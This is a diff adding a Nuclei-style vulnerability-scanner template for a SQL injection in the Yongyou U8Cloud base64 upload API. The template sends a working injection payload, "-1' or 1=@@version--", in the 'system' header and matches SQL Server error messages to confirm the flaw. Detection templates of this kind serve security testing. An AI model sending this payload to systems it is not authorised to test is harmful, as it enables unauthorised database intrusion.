@@ -1,0 +1,32 @@
+id: poc-yaml-yongyou-u8cloud-base64-sqli
+info:
+  name: Yongyou U8Cloud Base64 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Yongyou U8Cloud application is vulnerable to a SQL Injection vulnerability via the base64 upload API endpoint. This issue is exploitable by manipulating the 'system' header with SQL queries.
+  metadata:
+    fingerprint: Yongyou U8Cloud
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/u8cloud/api/file/upload/base64"
+    headers:
+      system: "-1' or 1=@@version--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        part: header
+        words:
+          - "application/json"
